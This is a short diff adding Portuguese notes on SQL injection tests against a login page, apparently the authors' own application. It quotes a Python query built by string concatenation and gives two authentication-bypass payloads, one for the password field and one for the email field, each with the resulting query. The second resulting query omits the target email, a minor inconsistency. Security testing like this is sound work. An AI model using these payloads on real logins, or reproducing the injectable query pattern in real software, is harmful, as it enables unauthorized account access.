@@ -1,0 +1,26 @@
+SQL Injection Tests:
+
+Login page: 
+
+Injection: ' OR 1=1-- //
+
+
+cursor.execute("SELECT ID, Email, Password FROM Utilizador WHERE Email ='" + str(params_dict["email"]) + "' AND Password='" + str(params_dict["password"] + "'"))
+
+Ao inserir a injection no password field a query fica:
+
+SELECT ID, Email, Password FROM Utilizador WHERE Email ='str(params_dict["email"])' AND Password='' OR 1=1 -- //
+
+Esta query devolve todas as linhas da tabela Utilizador, dando login na conta do 1º utilizador inserido na base de dados.
+
+
+Injection: <target_email>' -- //
+
+Ao inserir a injection no email field a query fica:
+
+SELECT ID, Email, Password FROM Utilizador WHERE Email ='' -- //' AND Password='str(params_dict["password"]'
+
+Permitindo assim o login na conta do utilizador cujo email é o email-alvo.
+
+
+
